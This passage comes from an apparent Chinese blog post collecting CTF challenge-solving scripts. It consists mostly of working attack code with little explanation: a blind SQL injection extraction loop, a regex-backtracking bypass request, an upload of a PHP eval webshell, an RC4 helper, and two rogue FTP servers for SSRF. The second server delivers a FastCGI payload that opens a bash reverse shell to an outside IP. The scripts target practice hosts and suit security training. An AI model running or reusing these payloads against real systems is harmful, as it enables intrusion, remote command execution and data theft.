class="comment">//同理构造。system。为什么不构造eval呢。大家可以去尝试一下</span></span><br><span class="line"><span class="comment">//$a='system';</span></span><br><span class="line"><span class="comment">//$b='eval';</span></span><br><span class="line"><span class="comment">//这两者动态调用的区别</span></span><br><span class="line"><span class="comment">//system是个函数。可以动态调用。而eval是PHP语法的一部分。并不是函数。不能动态调用</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'</span></span><br><span class="line">payload=<span class="string">'-1||((select 1,"&#123;&#125;")&gt;(select * from f1ag_1s_h3r3_hhhhh))'</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        hexchar=flag+chr(i)</span><br><span class="line">        py=payload.format(hexchar)</span><br><span class="line">        print(py)</span><br><span class="line">        datas=&#123;<span class="string">'id'</span>:py&#125;</span><br><span class="line">        <span class="keyword">import</span> time</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        re=requests.post(url=url,data=datas)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=chr(i<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="正则回溯"><a href="#正则回溯" class="headerlink" title="正则回溯"></a>正则回溯</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">'treasure'</span>: BytesIO(<span class="string">b'flag.php'</span> + <span class="string">b' a'</span> * <span class="number">1000000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://119.61.19.217:57305/treasure.php'</span>, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<h4 id="python文件上传"><a href="#python文件上传" class="headerlink" title="python文件上传"></a>python文件上传</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://8c8e609f-51ac-48b8-82ea-0f19cc24e3ea.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span></span><br><span class="line">payload = <span class="string">"&lt;?php eval($_POST['cmd']);?&gt;"</span></span><br><span class="line">file_data = &#123;<span class="string">"file"</span>: BytesIO(payload.encode())&#125;</span><br><span class="line">res = requests.post(url=url,files=file_data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+<h4 id="RC加密"><a href="#RC加密" class="headerlink" title="RC加密"></a>RC加密</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span><span class="params">(key = <span class="string">"init_key"</span>, message = <span class="string">"init_message"</span>)</span>:</span><span class="comment">#返回加密后得内容</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span><span class="params">(key)</span>:</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span><span class="params">(plain, box)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">""</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">'utf-8'</span>)), <span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="string">"HereIsTreasure"</span>  <span class="comment">#此处为密文</span></span><br><span class="line">message = input(<span class="string">"请输入明文:\n"</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = str(base64.b64decode(enc_base64),<span class="string">'utf-8'</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line">print(<span class="string">"rc4加密后的url编码:"</span>+enc_url)</span><br><span class="line"><span class="comment">#print("rc4加密后的base64编码"+enc_base64)</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="SSRF-恶意的-ftp-服务器（一）"><a href="#SSRF-恶意的-ftp-服务器（一）" class="headerlink" title="SSRF-恶意的 ftp 服务器（一）"></a>SSRF-恶意的 ftp 服务器（一）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line">s.bind((<span class="string">'0.0.0.0'</span>, <span class="number">23</span>))</span><br><span class="line">s.listen(<span class="number">1</span>)</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">conn.send(<span class="string">b'220 welcome\n'</span>)</span><br><span class="line"><span class="comment">#Service ready for new user.</span></span><br><span class="line"><span class="comment">#Client send anonymous username</span></span><br><span class="line"><span class="comment">#USER anonymous</span></span><br><span class="line">conn.send(<span class="string">b'331 Please specify the password.\n'</span>)</span><br><span class="line"><span class="comment">#User name okay, need password.</span></span><br><span class="line"><span class="comment">#Client send anonymous password.</span></span><br><span class="line"><span class="comment">#PASS anonymous</span></span><br><span class="line">conn.send(<span class="string">b'230 Login successful.\n'</span>)</span><br><span class="line"><span class="comment">#User logged in, proceed. Logged out if appropriate.</span></span><br><span class="line"><span class="comment">#TYPE I</span></span><br><span class="line">conn.send(<span class="string">b'200 Switching to Binary mode.\n'</span>)</span><br><span class="line"><span class="comment">#Size /</span></span><br><span class="line">conn.send(<span class="string">b'550 Could not get the file size.\n'</span>)</span><br><span class="line"><span class="comment">#EPSV (1)</span></span><br><span class="line">conn.send(<span class="string">b'150 ok\n'</span>)</span><br><span class="line"><span class="comment">#PASV</span></span><br><span class="line">conn.send(<span class="string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n'</span>) <span class="comment">#STOR / (2)</span></span><br><span class="line">conn.send(<span class="string">b'150 Permission denied.\n'</span>)</span><br><span class="line"><span class="comment">#QUIT</span></span><br><span class="line">conn.send(<span class="string">b'221 Goodbye.\n'</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>
+
+<h4 id="SSRF-恶意的-ftp-服务器（二）"><a href="#SSRF-恶意的-ftp-服务器（二）" class="headerlink" title="SSRF-恶意的 ftp 服务器（二）"></a>SSRF-恶意的 ftp 服务器（二）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/1/13 6:56 下午</span></span><br><span class="line"><span class="comment"># @Author  : tntaxin</span></span><br><span class="line"><span class="comment"># @File    : ftp_redirect.py</span></span><br><span class="line"><span class="comment"># @Software:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对gopherus生成的payload进行一次urldecode</span></span><br><span class="line">payload = unquote(<span class="string">"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00"</span>)</span><br><span class="line">payload = payload.encode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">'0.0.0.0'</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((host, port))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ftp被动模式的passvie port,监听到1234</span></span><br><span class="line">sk2 = socket.socket()</span><br><span class="line">sk2.bind((host, <span class="number">1234</span>))</span><br><span class="line">sk2.listen()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计数器，用于区分是第几次ftp连接</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    conn, address = sk.accept()</span><br><span class="line">    conn.send(<span class="string">b"200 \n"</span>)</span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># USER aaa\r\n  客户端传来用户名</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b"220 ready\n"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b"200 ready\n"</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))   <span class="comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b"215 \n"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b"200 \n"</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># SIZE /123\r\n  客户端询问文件/123的大小</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b"213 3 \n"</span>)  </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b"300 \n"</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># EPSV\r\n'</span></span><br><span class="line">    conn.send(<span class="string">b"200 \n"</span>)</span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))   <span class="comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b"227 127,0,0,1,4,210\n"</span>)  <span class="comment"># 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b"227 127,0,0,1,35,40\n"</span>)  <span class="comment"># 端口计算规则：35*256+40=9000</span></span><br><span class="line"></span><br><span class="line">    print(conn.recv(<span class="number">20</span>))  <span class="comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b"125 \n"</span>) <span class="comment"># 告诉客户端可以开始数据连接了</span></span><br><span class="line">        <span class="comment"># 新建一个socket给服务端返回我们的payload</span></span><br><span class="line">        print(<span class="string">"建立连接!"</span>)</span><br><span class="line">        conn2, address2 = sk2.accept()</span><br><span class="line">        conn2.send(payload)</span><br><span class="line">        conn2.close()</span><br><span class="line">        print(<span class="string">"断开连接!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b"150 \n"</span>)</span><br><span class="line">        print(conn.recv(<span class="number">20</span>))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b"226 \n"</span>)</span><br><span class="line">    conn.close()</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+
+    
+      
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Fany</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://fanygit.github.io/2021/11/09/CTF-解题脚本集合/" title="CTF-解题脚本集合">https://fanygit.github.io/2021/11/09/CTF-解题脚本集合/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/总结/" rel="tag"># 总结</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/11/08/CTF-Web【SSRF】漏洞做题姿势积累/" rel="next" title="CTF-Web【SSRF】漏洞做题姿势积累">
+                <i class="fa fa-chevron-left"></i> CTF-Web【SSRF】漏洞做题姿势积累
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/11/15/CTF-Web【SQL注入】漏洞做题姿势积累/" rel="prev" title="CTF-Web【SQL注入】漏洞做题姿势积累">
+                CTF-Web【SQL注入】漏洞做题姿势积累 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+  
+    
+    <div class="comments" id="comments"></div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  
+    <img class="site-author-image" itemprop="image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="/images/tx5.gif" alt="Fany">
+  
+  <p class="site-author-name" itemprop="name">Fany</p>
+  <div class="site-description motion-element" itemprop="description">千里之行，始于足下。</div>
+</div>
+
+
+  <nav class="site-state motion-element">
+    
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+
+
+
+
+  <div class="links-of-author motion-element">
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/fanygit" title="GitHub &rarr; https://github.com/fanygit" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:483813121@qq.com" title="E-Mail &rarr; mailto:483813121@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+
+
+
+  <div class="cc-license motion-element" itemprop="license">
+  
+  
+    
+  
+  
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4r